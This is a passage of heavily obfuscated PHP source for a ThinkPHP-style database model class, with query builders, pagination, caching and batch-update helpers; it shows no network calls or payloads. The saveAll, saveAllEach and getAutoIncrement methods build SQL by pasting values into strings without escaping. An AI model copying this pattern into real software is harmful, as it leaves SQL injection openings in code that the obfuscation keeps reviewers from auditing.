$this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ù²Š¡é› =& $_SERVER[Ş­ğŠìÒ]; return isset($this->fields[$Ù²Š¡é›[328]]) ? $this->fields[$Ù²Š¡é›[328]] : $this->pk; } public function getDbFields() { $ù¼‚›…ò =& $_SERVER[Ş­ğŠìÒ]; if (isset($this->options[$ù¼‚›…ò[356]])) { $Ù¿¹·ÁË = $this->db->getFields($this->options[$ù¼‚›…ò[356]]); return $Ù¿¹·ÁË ? array_keys($Ù¿¹·ÁË) : !1; } if ($this->fields) { $Ù¿¹·ÁË = $this->fields; unset($Ù¿¹·ÁË[$ù¼‚›…ò[327]], $Ù¿¹·ÁË[$ù¼‚›…ò[328]], $Ù¿¹·ÁË[$ù¼‚›…ò[329]], $Ù¿¹·ÁË[$ù¼‚›…ò[326]]); return $Ù¿¹·ÁË; } return !1; } public function data($äÆÉ‰ = '') { $·ÓŞ»ˆì =& $_SERVER[Ş­ğŠìÒ]; if ($·ÓŞ»ˆì[12] === $äÆÉ‰ && !empty($this->data)) { return $this->data; } if (is_object($äÆÉ‰)) { $äÆÉ‰ = get_object_vars($äÆÉ‰); } elseif (is_string($äÆÉ‰)) { parse_str($äÆÉ‰, $äÆÉ‰); } elseif (!is_array($äÆÉ‰)) { think_exception(think_lang($·ÓŞ»ˆì[348])); } $this->data = $äÆÉ‰; return $this; } public function join($öî”ì–¶) { $¼Œ¢áŸ× =& $_SERVER[Ş­ğŠìÒ]; if (is_array($öî”ì–¶)) { $this->options[$¼Œ¢áŸ×[359]] = $öî”ì–¶; } elseif (!empty($öî”ì–¶)) { $this->options[$¼Œ¢áŸ×[359]][] = $öî”ì–¶; } return $this; } public function union($‡¸Í†“, $ÖìÔ½Äá = false) { $Œ®¤òà² =& $_SERVER[Ş­ğŠìÒ]; if (empty($‡¸Í†“)) { return $this; } if ($ÖìÔ½Äá) { $this->options[$Œ®¤òà²[423]][$Œ®¤òà²[424]] = !0; } if (is_object($‡¸Í†“)) { $‡¸Í†“ = get_object_vars($‡¸Í†“); } if (is_string($‡¸Í†“)) { $ææšÛµ = $‡¸Í†“; } elseif (is_array($‡¸Í†“)) { if (isset($‡¸Í†“[0])) { $this->options[$Œ®¤òà²[423]] = array_merge($this->options[$Œ®¤òà²[423]], $‡¸Í†“); return $this; } else { $ææšÛµ = $‡¸Í†“; } } else { think_exception(think_lang($Œ®¤òà²[348])); } $this->options[$Œ®¤òà²[423]][] = $ææšÛµ; return $this; } public function cache($í´Øãø² = true, $ŸÛÍıÛ— = null, $£ı™ãìö = '') { $ôûÕú±Õ =& $_SERVER[Ş­ğŠìÒ]; if (!1 !== $í´Øãø²) { $this->options[$ôûÕú±Õ[425]] = array($ôûÕú±Õ[97] => $í´Øãø², $ôûÕú±Õ[415] => $ŸÛÍıÛ—, $ôûÕú±Õ[33] => $£ı™ãìö); } return $this; } public function field($¬ÂúÀ¶, $®ÙµıÉ = false) { $³¹Šæ—“ =& $_SERVER[Ş­ğŠìÒ]; if (!0 === $¬ÂúÀ¶) { $ÈèÓ¨… = $this->getDbFields(); $¬ÂúÀ¶ = $ÈèÓ¨… ? $ÈèÓ¨… : $³¹Šæ—“[220]; } elseif ($®ÙµıÉ) { if (is_string($¬ÂúÀ¶)) { $¬ÂúÀ¶ = explode($³¹Šæ—“[50], $¬ÂúÀ¶); } $ÈèÓ¨… = $this->getDbFields(); $¬ÂúÀ¶ = $ÈèÓ¨… ? array_diff($ÈèÓ¨…, $¬ÂúÀ¶) : $¬ÂúÀ¶; } $this->options[$³¹Šæ—“[350]] = $¬ÂúÀ¶; return $this; } public function scope($ÜÑÓıá = '', $ßÜÑù²‚ = NULL) { $Ş«şÍÊ³ =& $_SERVER[Ş­ğŠìÒ]; if ($Ş«şÍÊ³[12] === $ÜÑÓıá) { if (isset($this->_scope[$Ş«şÍÊ³[37]])) { $Ë•¦¿ŒÉ = $this->_scope[$Ş«şÍÊ³[37]]; } else { return $this; } } elseif (is_string($ÜÑÓıá)) { $íÛ£È = explode($Ş«şÍÊ³[50], $ÜÑÓıá); $Ë•¦¿ŒÉ = array(); foreach ($íÛ£È as $·ÖÀ×Ñ) { if (!isset($this->_scope[$·ÖÀ×Ñ])) { continue; } $Ë•¦¿ŒÉ = array_merge($Ë•¦¿ŒÉ, $this->_scope[$·ÖÀ×Ñ]); } if (!empty($ßÜÑù²‚) && is_array($ßÜÑù²‚)) { $Ë•¦¿ŒÉ = array_merge($Ë•¦¿ŒÉ, $ßÜÑù²‚); } } elseif (is_array($ÜÑÓıá)) { $Ë•¦¿ŒÉ = $ÜÑÓıá; } if (is_array($Ë•¦¿ŒÉ) && !empty($Ë•¦¿ŒÉ)) { $this->options = array_merge($this->options, array_change_key_case($Ë•¦¿ŒÉ)); } return $this; } public function where($İÙÍğ‘Ü, $à²±€¯ = null) { $…ªöœ‡ =& $_SERVER[Ş­ğŠìÒ]; if (!is_null($à²±€¯) && is_string($İÙÍğ‘Ü)) { if (!is_array($à²±€¯)) { $à²±€¯ = func_get_args(); array_shift($à²±€¯); } $à²±€¯ = array_map(array($this->db, $…ªöœ‡[419]), $à²±€¯); $İÙÍğ‘Ü = vsprintf($İÙÍğ‘Ü, $à²±€¯); } elseif (is_object($İÙÍğ‘Ü)) { $İÙÍğ‘Ü = get_object_vars($İÙÍğ‘Ü); } elseif (is_array($İÙÍğ‘Ü)) { foreach ($İÙÍğ‘Ü as $æÃŸ‚™ƒ => $‚‹³€ó) { if ((is_numeric($æÃŸ‚™ƒ) || !$æÃŸ‚™ƒ) && is_string($‚‹³€ó)) { if (strpos($‚‹³€ó, $…ªöœ‡[426]) === 0) { continue; } think_trace($…ªöœ‡[427], $…ªöœ‡[12], $…ªöœ‡[49]); die; } } } if (is_string($İÙÍğ‘Ü) && $…ªöœ‡[12] != $İÙÍğ‘Ü) { $“ãö°Ñ = array(); $“ãö°Ñ[$…ªöœ‡[428]] = $İÙÍğ‘Ü; $İÙÍğ‘Ü = $“ãö°Ñ; } if (isset($this->options[$…ªöœ‡[352]])) { $this->options[$…ªöœ‡[352]] = array_merge($this->options[$…ªöœ‡[352]], $İÙÍğ‘Ü); } else { $this->options[$…ªöœ‡[352]] = $İÙÍğ‘Ü; } return $this; } public function limit($ñ»æËÉô, $¥ÏÈ“£ = null) { $ëÀË¦§ =& $_SERVER[Ş­ğŠìÒ]; $this->options[$ëÀË¦§[368]] = is_null($¥ÏÈ“£) ? $ñ»æËÉô : $ñ»æËÉô . $ëÀË¦§[50] . $¥ÏÈ“£; return $this; } public function page($ÌÜÆßßİ, $ƒŸ…ö¼ = null) { $ˆ¹ğÕé =& $_SERVER[Ş­ğŠìÒ]; $this->options[$ˆ¹ğÕé[429]] = is_null($ƒŸ…ö¼) ? $ÌÜÆßßİ : $ÌÜÆßßİ . $ˆ¹ğÕé[50] . $ƒŸ…ö¼; return $this; } public function comment($•öÑÌâÓ) { $this->options[$_SERVER[Ş­ğŠìÒ][430]] = $•öÑÌâÓ; return $this; } public function setProperty($½É ®çÛ, $‘¯‘Ò¬‚) { if (property_exists($this, $½É ®çÛ)) { $this->{$½É ®çÛ} = $‘¯‘Ò¬‚; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\x54\151\155\145", "\164\151\x6d\x65", "\151\156\163\145\162\164\x2c\165\x70\144\x61\164\x65", "\x66\x75\x6e\x63\164\x69\x6f\x6e"), array("\143\x72\x65\x61\x74\x65\x54\x69\155\145", "\x74\151\155\145", "\x69\x6e\163\145\162\164", "\x66\x75\x6e\x63\164\151\x6f\156")); public function setDataAuto($å¶İú) { $this->dataAuto = $å¶İú; } public function __construct($ ÓıÈè = '', $öíŒË© = '', $Ä­ÏŠ»  = '') { parent::__construct($ ÓıÈè, $öíŒË©, $Ä­ÏŠ» ); } protected $tableMeta = array(); protected function _beforeInsert(&$Â²éÙ€Ã, $ÀŞâÁ ø) { $ÒŠßõÀ¨ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->checkDataAutoHas($ÒŠßõÀ¨[431])) { return; } $this->dataBeforeFilter($Â²éÙ€Ã, $ÒŠßõÀ¨[431]); } protected function _beforeUpdate(&$Ì‡ÙÃßñ, $ù°õÛşÇ) { $Ê¥İ® € =& $_SERVER[Ş­ğŠìÒ]; if (!$this->checkDataAutoHas($Ê¥İ® €[432])) { return; } $this->dataBeforeFilter($Ì‡ÙÃßñ, $Ê¥İ® €[432]); } protected function _afterSelect(&$£Å³¡ßÇ, $ÈÎë€¯ş) { if (!is_array($£Å³¡ßÇ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ş­ğŠìÒ][433])) { return; } foreach ($£Å³¡ßÇ as &$œ·‡¸) { $this->dataAfterFilter($œ·‡¸); } unset($œ·‡¸); } protected function _afterFind(&$­ªã¸³, $ÉİÖÆÚØ) { if (!is_array($­ªã¸³)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ş­ğŠìÒ][433])) { return; } $this->dataAfterFilter($­ªã¸³); } public static function textEncode($˜¦ªŒ¼Â) { if (!$˜¦ªŒ¼Â) { return $˜¦ªŒ¼Â; } $ßì«âñ® = json_encode($˜¦ªŒ¼Â); $ßì«âñ® = preg_replace_callback($_SERVER[Ş­ğŠìÒ][434], function ($çÖö¢ö) { return addslashes($çÖö¢ö[0]); }, $ßì«âñ®); return json_decode($ßì«âñ®); } public static function textDecode($º¦öÓ‚Â) { $†ÜŞ°Ã =& $_SERVER[Ş­ğŠìÒ]; $ßÙÍû¥¸ = json_encode($º¦öÓ‚Â); $ßÙÍû¥¸ = preg_replace_callback($†ÜŞ°Ã[435], function ($ø˜£ê™ï) { return $_SERVER[Ş­ğŠìÒ][100]; }, $ßÙÍû¥¸); return json_decode($ßÙÍû¥¸); } public function setAutoIncrement($ÉËèÛóÏ) { $ñ‹÷« = array($this->getPk() => $ÉËèÛóÏ); $Ğ¨±¥¦ = $this->data($ñ‹÷«)->add(); if ($Ğ¨±¥¦) { $this->delete($Ğ¨±¥¦); } } public function getAutoIncrement() { $„Ä¸¾ = $this->getTableName(); $¤Íşï½ï = $this->max($this->getPk()); $¾ÎÇ‡• = $this->query("\163\x68\157\x77\40\164\141\x62\x6c\x65\x20\163\164\x61\x74\x75\163\x20\167\150\x65\x72\x65\x20\116\141\155\145\75\47{$„Ä¸¾}\x27"); $íæüÔ‰Î = $¾ÎÇ‡•[0][$_SERVER[Ş­ğŠìÒ][436]]; $Ú«öÎƒé = max($¤Íşï½ï, $íæüÔ‰Î); return $Ú«öÎƒé; } protected function _callBefore($ş–×”è», $ÔÈå„ºŒ) { return $this->cacheCallCheck($ş–×”è», $ÔÈå„ºŒ, !1); } protected function _callAfter($–ÜİŞŸ†, $¤Ù§ëñó) { return $this->cacheCallCheck($–ÜİŞŸ†, $¤Ù§ëñó, !0); } protected function cacheFunctionAlias($õÏ™çªœ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ĞõÌ÷¤Ó, $Å³Öì¤, $Æ§ËåÁŠ = false) { $ëìÂØ»‚ = $this->cacheFunctionAlias($Å³Öì¤); if (!$ëìÂØ»‚) { return; } foreach ($ëìÂØ»‚ as $ˆÏæò§€ => $š‡Æ’¾) { $¥Óãöº± = $š‡Æ’¾[0]; $œÍì™µ£ = explode($_SERVER[Ş­ğŠìÒ][50], $š‡Æ’¾[1]); if ($ĞõÌ÷¤Ó == $ˆÏæò§€) { return $this->cacheFunctionGet($ˆÏæò§€, $¥Óãöº±); } if ($Æ§ËåÁŠ && in_array($ĞõÌ÷¤Ó, $œÍì™µ£)) { $this->cacheFunctionClear($ˆÏæò§€, $¥Óãöº±); } } } public function cacheFunctionGet($•“¬íÆ«, $ñÓÕå) { $á€Š‚‚Ï = $this->cacheKeyMake($•“¬íÆ«, $ñÓÕå); $ãö¹¾ñú = Cache::get($á€Š‚‚Ï); if (!is_array($ãö¹¾ñú)) { $ãö¹¾ñú = call_user_func_array(array($this, $•“¬íÆ«), array($ñÓÕå, !0)); Cache::set($á€Š‚‚Ï, $ãö¹¾ñú); } return $ãö¹¾ñú; } public function cacheFunctionClear($ÑÖ‰Ş½„, $èŠÊêù”) { $ıßë±ƒ‹ = $èŠÊêù”; if (!is_array($èŠÊêù”)) { $ıßë±ƒ‹ = array($èŠÊêù”); } foreach ($ıßë±ƒ‹ as $œàÚ®’ß) { $¡´¶ëèò = $this->cacheKeyMake($ÑÖ‰Ş½„, $œàÚ®’ß); Cache::remove($¡´¶ëèò); } } private function cacheKeyMake($ÜÑ…ƒ›, $™£ñÈå) { $ŞÛ±ûûÚ =& $_SERVER[Ş­ğŠìÒ]; return get_class($this) . $ŞÛ±ûûÚ[11] . $ÜÑ…ƒ› . $ŞÛ±ûûÚ[437] . $™£ñÈå; } protected function selectPageReset() { $ëÊõ¾¬ =& $_SERVER[Ş­ğŠìÒ]; if (isset($GLOBALS[$ëÊõ¾¬[438]])) { return; } $GLOBALS[$ëÊõ¾¬[438]] = isset($GLOBALS[$ëÊõ¾¬[7]][$ëÊõ¾¬[439]]) ? $GLOBALS[$ëÊõ¾¬[7]][$ëÊõ¾¬[439]] : !1; $GLOBALS[$ëÊõ¾¬[440]] = isset($GLOBALS[$ëÊõ¾¬[7]][$ëÊõ¾¬[429]]) ? $GLOBALS[$ëÊõ¾¬[7]][$ëÊõ¾¬[429]] : !1; $GLOBALS[$ëÊõ¾¬[7]][$ëÊõ¾¬[439]] = !1; $GLOBALS[$ëÊõ¾¬[7]][$ëÊõ¾¬[429]] = !1; } protected function selectPageRestore() { $å±õíËØ =& $_SERVER[Ş­ğŠìÒ]; if (!isset($GLOBALS[$å±õíËØ[438]])) { return; } $GLOBALS[$å±õíËØ[7]][$å±õíËØ[439]] = $GLOBALS[$å±õíËØ[438]]; $GLOBALS[$å±õíËØ[7]][$å±õíËØ[429]] = $GLOBALS[$å±õíËØ[440]]; if ($GLOBALS[$å±õíËØ[7]][$å±õíËØ[439]] === !1) { unset($GLOBALS[$å±õíËØ[7]][$å±õíËØ[439]]); } if ($GLOBALS[$å±õíËØ[7]][$å±õíËØ[429]] === !1) { unset($GLOBALS[$å±õíËØ[7]][$å±õíËØ[429]]); } unset($GLOBALS[$å±õíËØ[438]]); unset($GLOBALS[$å±õíËØ[440]]); } protected function selectPage($×…­ö©“ = 200, $úÌİ€æá = 1) { $ß½¼Ö© =& $_SERVER[Ş­ğŠìÒ]; global $in; $öƒ†ä„ª = $this->optionsValue(); $Çï¯¡± = 50000; $×…­ö©“ = isset($in[$ß½¼Ö©[439]]) && $in[$ß½¼Ö©[439]] ? $in[$ß½¼Ö©[439]] : $×…­ö©“; if ($×…­ö©“ === -1) { $in[$ß½¼Ö©[439]] = !1; $Çï¯¡± = 100000000; $×…­ö©“ = $Çï¯¡±; } $µçÕ°„ = $öƒ†ä„ª; $µçÕ°„[$ß½¼Ö©[441]] = array(); $×…­ö©“ = intval($×…­ö©“); $×…­ö©“ = $×…­ö©“ <= 5 ? 5 : ($×…­ö©“ >= $Çï¯¡± ? $Çï¯¡± : $×…­ö©“); $úÌİ€æá = intval(isset($in[$ß½¼Ö©[429]]) && $in[$ß½¼Ö©[429]] ? $in[$ß½¼Ö©[429]] : $úÌİ€æá); $úÌİ€æá = $úÌİ€æá <= 1 ? 1 : $úÌİ€æá; $â¢õìºê = array(); $Ï¬…Ã½Ñ = 1; if ($úÌİ€æá == 1 && $Ï¬…Ã½Ñ) { $this->optionsValue($öƒ†ä„ª); $â¢õìºê = $this->page($úÌİ€æá, $×…­ö©“)->select(); $òÏªä¬ü = is_array($â¢õìºê) ? count($â¢õìºê) : 0; if ($òÏªä¬ü < $×…­ö©“) { $µ¾úÆ¨Ù = 1; } else { $this->optionsValue($µçÕ°„); $òÏªä¬ü = intval($this->count()); $µ¾úÆ¨Ù = ceil($òÏªä¬ü / $×…­ö©“); } } else { $this->optionsValue($µçÕ°„); $òÏªä¬ü = intval($this->count()); $µ¾úÆ¨Ù = ceil($òÏªä¬ü / $×…­ö©“); $úÌİ€æá = $úÌİ€æá >= $µ¾úÆ¨Ù ? $µ¾úÆ¨Ù : $úÌİ€æá; $this->optionsValue($öƒ†ä„ª); $â¢õìºê = $this->page($úÌİ€æá, $×…­ö©“)->select(); } if (!is_array($â¢õìºê)) { $â¢õìºê = array(); } if ($µ¾úÆ¨Ù == 1) { $òÏªä¬ü = count($â¢õìºê); } $Üß¬­Àó = array($ß½¼Ö©[442] => array($ß½¼Ö©[443] => $òÏªä¬ü, $ß½¼Ö©[439] => $×…­ö©“, $ß½¼Ö©[429] => $úÌİ€æá, $ß½¼Ö©[444] => $µ¾úÆ¨Ù), $ß½¼Ö©[445] => $â¢õìºê); return $Üß¬­Àó; } protected function checkLength($ÈÖÜã´Í, $‰Òé¦Ç… = 0, $õ©ßæ¾ = '') { $Œ×è“¿Ğ =& $_SERVER[Ş­ğŠìÒ]; $‰Òé¦Ç… = $‰Òé¦Ç… ? $‰Òé¦Ç… : 65536; if (!$ÈÖÜã´Í || strlen($ÈÖÜã´Í) < $‰Òé¦Ç…) { return; } $õ©ßæ¾ = $õ©ßæ¾ ? $õ©ßæ¾ . $Œ×è“¿Ğ[74] : $Œ×è“¿Ğ[12]; show_json($õ©ßæ¾ . LNG($Œ×è“¿Ğ[446]) . "\50{$‰Òé¦Ç…}\51", !1); } protected function metaSet($­ò ’Ã€, $®ãæñı = null, $²œˆóé  = null) { $Áæ‰ÈõŸ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->tableMeta || !$­ò ’Ã€) { return !1; } $¼‡á‚— = $this->tableMeta[$Áæ‰ÈõŸ[447]]; $î÷Õ—¤¦ = $this->tableMeta[$Áæ‰ÈõŸ[448]]; $Èá¨Ï¶« = Model($î÷Õ—¤¦); $ó©½ó¶“ = array($¼‡á‚— => $­ò ’Ã€, $Áæ‰ÈõŸ[449] => $®ãæñı); if (is_null($®ãæñı)) { return $Èá¨Ï¶«->where(array($¼‡á‚— => $­ò ’Ã€))->delete(); } if (is_null($²œˆóé ) && is_string($®ãæñı)) { return $Èá¨Ï¶«->where($ó©½ó¶“)->delete(); } $ÌË©¯Ë’ = is_array($®ãæñı) ? $®ãæñı : array(); if (is_string($®ãæñı)) { $ÌË©¯Ë’[$®ãæñı] = $²œˆóé ; } $‹ˆÕÈ‚• = array(); foreach ($ÌË©¯Ë’ as $›”Ë™Ô¸ => $‹‡ò´Ç¢) { if (is_null($‹‡ò´Ç¢) && is_string($›”Ë™Ô¸)) { $Èá¨Ï¶«->where(array($¼‡á‚— => $­ò ’Ã€, $Áæ‰ÈõŸ[449] => $›”Ë™Ô¸))->delete(); continue; } $this->checkLength($‹‡ò´Ç¢, !1, $î÷Õ—¤¦ . $Áæ‰ÈõŸ[4] . $›”Ë™Ô¸); $‹ˆÕÈ‚•[] = array($¼‡á‚— => $­ò ’Ã€, $Áæ‰ÈõŸ[97] => $›”Ë™Ô¸, $Áæ‰ÈõŸ[450] => $‹‡ò´Ç¢); } $øîª‰Ü = $Áæ‰ÈõŸ[451] . $î÷Õ—¤¦; CacheLock::lock($øîª‰Ü); $Èá¨Ï¶«->where(array($¼‡á‚— => $­ò ’Ã€))->addAll($‹ˆÕÈ‚•, array(), !0); CacheLock::unlock($øîª‰Ü); return !0; } public function metaGet($‰ü¾ËÅ‘, $óÓêúÕş = false) { $ÔÅà¬·… =& $_SERVER[Ş­ğŠìÒ]; if (!$this->tableMeta) { return array(); } $ÅÚ¼œâ· = $this->tableMeta[$ÔÅà¬·…[447]]; $œô»¦š­ = Model($this->tableMeta[$ÔÅà¬·…[448]]); if ($óÓêúÕş) { $İÍÆš»Ñ = array($ÅÚ¼œâ· => $‰ü¾ËÅ‘, $ÔÅà¬·…[97] => $óÓêúÕş); return $œô»¦š­->where($İÍÆš»Ñ)->getField($ÔÅà¬·…[450]); } $İÍÆš»Ñ = array($ÅÚ¼œâ· => $‰ü¾ËÅ‘); $¶œËœ”¹ = $œô»¦š­->field($ÔÅà¬·…[452])->where($İÍÆš»Ñ)->select(); $¶œËœ”¹ = array_to_keyvalue($¶œËœ”¹, $ÔÅà¬·…[97], $ÔÅà¬·…[450]); return $¶œËœ”¹; } private function checkDataAutoHas($÷ã‹Èöº) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¬²››Ú) { if (in_array($÷ã‹Èöº, explode($_SERVER[Ş­ğŠìÒ][50], $¬²››Ú[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¯Ñ¤éá¾, $¢ËÀÈ­µ) { $®Ë‚”‚¤ =& $_SERVER[Ş­ğŠìÒ]; if (!is_array($¯Ñ¤éá¾)) { return; } foreach ($this->dataAuto as $Ó¼ÇŞí‚) { $ÑÆÎŞş— = $Ó¼ÇŞí‚[0]; if (!in_array($¢ËÀÈ­µ, explode($®Ë‚”‚¤[50], $Ó¼ÇŞí‚[2]))) { continue; } switch (trim($Ó¼ÇŞí‚[3])) { case $®Ë‚”‚¤[397]: case $®Ë‚”‚¤[398]: $úöÕĞØ = $Ó¼ÇŞí‚[1]; $¸÷Çªâ = isset($Ó¼ÇŞí‚[4]) ? (array) $Ó¼ÇŞí‚[4] : array(); if ($úöÕĞØ == $®Ë‚”‚¤[206] && array_key_exists($ÑÆÎŞş—, $¯Ñ¤éá¾)) { if (!$¯Ñ¤éá¾[$ÑÆÎŞş—]) { unset($¯Ñ¤éá¾[$ÑÆÎŞş—]); } break; } if (isset($¯Ñ¤éá¾[$ÑÆÎŞş—])) { array_unshift($¸÷Çªâ, $¯Ñ¤éá¾[$ÑÆÎŞş—]); } if ($®Ë‚”‚¤[397] == $Ó¼ÇŞí‚[3]) { $¯Ñ¤éá¾[$ÑÆÎŞş—] = call_user_func_array($úöÕĞØ, $¸÷Çªâ); } else { $¯Ñ¤éá¾[$ÑÆÎŞş—] = call_user_func_array(array(&$this, $úöÕĞØ), $¸÷Çªâ); } break; case $®Ë‚”‚¤[347]: if (isset($¯Ñ¤éá¾[$ÑÆÎŞş—]) && $¯Ñ¤éá¾[$ÑÆÎŞş—]) { $¯Ñ¤éá¾[$ÑÆÎŞş—] = call_user_func_array(array(&$this, $Ó¼ÇŞí‚[1]), array($¯Ñ¤éá¾[$ÑÆÎŞş—])); } break; case $®Ë‚”‚¤[350]: $¯Ñ¤éá¾[$ÑÆÎŞş—] = $¯Ñ¤éá¾[$Ó¼ÇŞí‚[1]]; break; case $®Ë‚”‚¤[370]: if (isset($¯Ñ¤éá¾[$ÑÆÎŞş—]) && !is_string($¯Ñ¤éá¾[$ÑÆÎŞş—])) { $¯Ñ¤éá¾[$ÑÆÎŞş—] = json_encode_force($¯Ñ¤éá¾[$ÑÆÎŞş—]); } break; case $®Ë‚”‚¤[399]: if ($¯Ñ¤éá¾[$ÑÆÎŞş—] === $®Ë‚”‚¤[12]) { unset($¯Ñ¤éá¾[$ÑÆÎŞş—]); } break; case $®Ë‚”‚¤[400]: $¯Ñ¤éá¾[$ÑÆÎŞş—] = $Ó¼ÇŞí‚[1]; default: break; } } if ($¢ËÀÈ­µ == $®Ë‚”‚¤[431]) { $¢àºÕŠ = strtolower($this->db->getDbType()); if (strpos($¢àºÕŠ, $®Ë‚”‚¤[13]) !== 0) { return; } $Ã¢ü·Á = $this->field(!0)->fields; $æ±¥´ïº = $Ã¢ü·Á[$®Ë‚”‚¤[329]]; if (isset($Ã¢ü·Á[$®Ë‚”‚¤[328]])) { unset($æ±¥´ïº[$Ã¢ü·Á[$®Ë‚”‚¤[328]]]); } foreach ($æ±¥´ïº as $È©éÄ® => $¢ËÀÈ­µ) { if (!isset($¯Ñ¤éá¾[$È©éÄ®])) { $¯Ñ¤éá¾[$È©éÄ®] = $®Ë‚”‚¤[12]; } } } } private function dataAfterFilter(&$£Î°¡ãà) { $Î–ûˆŸÑ =& $_SERVER[Ş­ğŠìÒ]; foreach ($this->dataAuto as $¹ù¼Ä‰) { $çÉ†šˆ = $¹ù¼Ä‰[0]; if (!isset($£Î°¡ãà[$çÉ†šˆ])) { continue; } if (!in_array($Î–ûˆŸÑ[433], explode($Î–ûˆŸÑ[50], $¹ù¼Ä‰[2]))) { continue; } switch (trim($¹ù¼Ä‰[3])) { case $Î–ûˆŸÑ[397]: case $Î–ûˆŸÑ[398]: $èãĞé ø = isset($¹ù¼Ä‰[4]) ? (array) $¹ù¼Ä‰[4] : array(); array_unshift($èãĞé ø, $£Î°¡ãà[$çÉ†šˆ]); if (isset($¹ù¼Ä‰[4]) && $¹ù¼Ä‰[4] == $Î–ûˆŸÑ[453]) { $èãĞé ø = array($£Î°¡ãà[$çÉ†šˆ]); } if ($Î–ûˆŸÑ[397] == $¹ù¼Ä‰[3]) { $£Î°¡ãà[$çÉ†šˆ] = call_user_func_array($¹ù¼Ä‰[1], $èãĞé ø); } else { $£Î°¡ãà[$çÉ†šˆ] = call_user_func_array(array(&$this, $¹ù¼Ä‰[1]), $èãĞé ø); } break; case $Î–ûˆŸÑ[347]: if (isset($£Î°¡ãà[$çÉ†šˆ]) && $£Î°¡ãà[$çÉ†šˆ]) { $£Î°¡ãà[$çÉ†šˆ] = call_user_func_array(array(&$this, $¹ù¼Ä‰[1]), array($£Î°¡ãà[$çÉ†šˆ])); } break; case $Î–ûˆŸÑ[350]: $£Î°¡ãà[$çÉ†šˆ] = $£Î°¡ãà[$¹ù¼Ä‰[1]]; break; case $Î–ûˆŸÑ[370]: $ÑËäÖğ˜ = $£Î°¡ãà[$çÉ†šˆ]; $£Î°¡ãà[$çÉ†šˆ] = json_decode($ÑËäÖğ˜, !0); if (is_null($£Î°¡ãà[$çÉ†šˆ])) { $£Î°¡ãà[$çÉ†šˆ] = $ÑËäÖğ˜; } break; case $Î–ûˆŸÑ[399]: if ($£Î°¡ãà[$çÉ†šˆ] === $Î–ûˆŸÑ[12]) { unset($£Î°¡ãà[$çÉ†šˆ]); } break; case $Î–ûˆŸÑ[400]: $£Î°¡ãà[$çÉ†šˆ] = $¹ù¼Ä‰[1]; break; default: break; } } } public function saveAll($ŠôĞÅ¥Ç) { $ÖµóöÀ¿ =& $_SERVER[Ş­ğŠìÒ]; $Öß†×±ï = $this->tablePrefix . $this->tableName; $£šˆ»ú” = self::SQL_WHERE_IN_CHUNK; $ŠôĞÅ¥Ç = is_array($ŠôĞÅ¥Ç) ? $ŠôĞÅ¥Ç : array(); $ÛØ¶¤ = $ÖµóöÀ¿[454]; $ÅßÓâïû = 0; $‡š²Ö¥ = array(); $¹éñ¦–ó = count($ŠôĞÅ¥Ç); for ($Ê¾Æö = 0; $Ê¾Æö < $¹éñ¦–ó; $Ê¾Æö++) { $¬‡®éëì = $ŠôĞÅ¥Ç[$Ê¾Æö]; if (!is_array($¬‡®éëì) || count($¬‡®éëì) != 4) { continue; } $‰©ÊøøÒ = "\125\120\104\x41\124\105\40\140{$Öß†×±ï}\140\x20\123\x45\124\x20{$¬‡®éëì[2]}\x20\x3d\x20\x43\101\x53\105\40{$¬‡®éëì[0]}\40\12"; if ($ÅßÓâïû == 0) { $ÛØ¶¤ = $‰©ÊøøÒ; } $‡š²Ö¥[] = $ÖµóöÀ¿[121] . $¬‡®éëì[1] . $ÖµóöÀ¿[121]; $ÅßÓâïû++; $ÛØ¶¤ .= "\x20\x57\x48\105\x4e\40\47{$¬‡®éëì[1]}\47\40\124\110\x45\x4e\40\47{$¬‡®éëì[3]}\x27\x20\12"; if ($ÅßÓâïû == $£šˆ»ú” || $Ê¾Æö == $¹éñ¦–ó - 1) { $ªœ˜ªÊš = implode($ÖµóöÀ¿[50], $‡š²Ö¥); $ÛØ¶¤ .= "\x20\105\x4e\104\x20\40\127\x48\105\122\x45\40{$¬‡®éëì[0]}\40\111\x4e\x20\x28{$ªœ˜ªÊš}\51\x20"; $this->execute($ÛØ¶¤); $ÅßÓâïû = 0; $ÛØ¶¤ = $‰©ÊøøÒ; $this->chunkEventCheck(count($‡š²Ö¥)); $‡š²Ö¥ = array(); } } $this->chunkEventSet(); } public function saveAllEach($±Ş–¿úª) { $¸•¾‹­ =& $_SERVER[Ş­ğŠìÒ]; $Š¿šÖª¾ = $this->tablePrefix . $this->tableName; foreach ($±Ş–¿úª as $¶÷½±äˆ) { if (!is_array($¶÷½±äˆ) || count($¶÷½±äˆ) != 4) { continue; } $¾ìàÑå = $¶÷½±äˆ[0] . $¸•¾‹­[455] . $¶÷½±äˆ[1] . $¸•¾‹­[121]; $Ôûöùù = $¶÷½±äˆ[2] . $¸•¾‹­[455] . $¶÷½±äˆ[3] . $¸•¾‹­[121]; $ã•¬Ø¥ = "\x75\x70\144\x61\x74\x65\x20{$Š¿šÖª¾}\40\163\145\164\40{$Ôûöùù}\40\x77\150\x65\162\x65\x20{$¾ìàÑå}\x3b"; $this->execute($ã•¬Ø¥); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Û®êú­ = false, $˜“«é„± = false) { $this->_chunkEvent = $Û®êú­; $this->_chunkEventParam = $˜“«é„±; } private function chunkEventCheck($—Ò¥š«û) { if (!$this->_chunkEvent) { return; } $ßĞÇÉÈ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ßĞÇÉÈ[$_SERVER[Ş­ğŠìÒ][456]] = $—Ò¥š«û; Hook::trigger($this->_chunkEvent, $ßĞÇÉÈ); } public function addAll($ì£²Öê³, $ş¼‡ˆû = array(), $¼·ÒÛõº = false) { $Õãõš‹Ü =& $_SERVER[Ş­ğŠìÒ]; ignore_timeout(); $ìƒëĞ”Ã = self::SQL_WHERE_IN_CHUNK; if (empty($ì£²Öê³)) { $this->error = think_lang($Õãõš‹Ü[348]); return !1; } 